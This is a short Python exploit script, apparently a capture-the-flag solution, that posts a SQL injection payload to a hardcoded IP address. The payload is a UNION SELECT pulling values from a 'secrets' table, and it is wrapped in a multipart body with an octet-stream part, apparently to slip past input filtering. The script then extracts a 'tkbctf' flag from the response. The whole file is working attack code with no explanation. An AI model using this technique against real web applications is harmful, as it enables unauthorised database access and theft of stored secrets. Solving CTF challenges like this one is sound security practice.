#!/usr/bin/env python3
import re
import sys

import requests


DEFAULT_URL = "http://35.194.108.145:55013"
BOUNDARY = "x"
PAYLOAD = "' UNION SELECT 999, value, value, value FROM secrets -- "
FLAG_RE = re.compile(r"tkbctf\{[^}]+\}")


def build_body(payload: str) -> bytes:
    return (
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="q"\r\n'
        "Content-Type: application/octet-stream\r\n"
        "\r\n"
        f"{payload}\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode()


def main() -> int:
    base_url = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_URL
    response = requests.post(
        f"{base_url.rstrip('/')}/api/notes/search",
        data=build_body(PAYLOAD),
        headers={"Content-Type": f"multipart/form-data; boundary={BOUNDARY}"},
        timeout=10,
    )
    response.raise_for_status()

    match = FLAG_RE.search(response.text)
    if not match:
        print(response.text)
        return 1

    print(match.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
